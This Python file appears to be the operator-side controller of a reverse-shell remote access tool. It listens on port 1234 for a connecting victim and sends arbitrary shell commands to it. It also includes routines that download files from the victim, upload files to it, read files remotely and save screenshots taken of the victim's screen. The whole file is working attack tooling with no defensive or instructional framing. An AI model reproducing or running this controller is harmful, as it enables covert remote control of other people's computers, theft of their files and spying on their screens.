#To add the feature of Screenshots
import socket
from datetime import date, datetime

def transfer(c):
    destination = input("Enter the destination location: ")
    f = open(destination, "wb")
    while True:
        bits = c.recv(1024)
        # DE96CEE525AF2AF436B5A7BD2E6565FB377FD98BCA30A82F39FAB9ECE9FE7042 is the hash of the string "this is the end of file"
        if b'DE96CEE525AF2AF436B5A7BD2E6565FB377FD98BCA30A82F39FAB9ECE9FE7042' in bits:
            bits = bits[0:-64]
            f.write(bits)
            break
        f.write(bits)
    print("[+] Transfer Complete")
    f.close()

def upload(c):
    filename = cmd.split("*")[1]
    f = open(filename,'rb')
    while True:
        bits = f.read(1024)
        c.send(bits)
        if bits == b'':
            c.send('DE96CEE525AF2AF436B5A7BD2E6565FB377FD98BCA30A82F39FAB9ECE9FE7042'.encode())
            break
    f.close()
    print("[+] Transfer Complete")

def cat(c):
    print("\n-----------------" + cmd.split("*")[1] + "-----------------\n")
    while True:
        bits = c.recv(1024)
        if b'DE96CEE525AF2AF436B5A7BD2E6565FB377FD98BCA30A82F39FAB9ECE9FE7042' in bits:
            temp = bits[0:-64]
            bits = temp
            print(bits.decode())
            break
        print(bits.decode())
    print("\n-----------------EOF-----------------\n")

def screenshot(c):
    destination = "Screenshots\\" + str(date.today()) + "_" +str(datetime.now().strftime("%H_%M_%S")) +".png"
    f = open(destination, "wb")
    while True:
        bits = c.recv(1024)
        # DE96CEE525AF2AF436B5A7BD2E6565FB377FD98BCA30A82F39FAB9ECE9FE7042 is the hash of the string "this is the end of file"
        if b'DE96CEE525AF2AF436B5A7BD2E6565FB377FD98BCA30A82F39FAB9ECE9FE7042' in bits:
            bits = bits[0:-64]
            f.write(bits)
            break
        f.write(bits)
    print("[+] Transfer Complete")
    f.close()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
port = 1234
s.bind(('', port))
s.listen(1)
c,addr = s.accept()
shell = c.recv(1024).decode() + ">"
user = c.recv(1024).decode()
print("\n[+] Got Connection from ", user, "\n")
while True:
    cmd = input(shell)
    if 'get' in cmd:
        c.send(cmd.encode())
        transfer(c)
        continue
    elif 'upload' in cmd:
        c.send(cmd.encode())
        upload(c)
        continue
    elif 'exit' in cmd:
        c.send(cmd.encode())
        break
    elif 'cat' in cmd:
        c.send(cmd.encode())
        cat(c)
        continue
    elif cmd == 'ss':
        c.send(cmd.encode())
        screenshot(c)
        continue
    c.send(cmd.encode())
    shell = c.recv(1024).decode()
    print(c.recv(10240).decode())
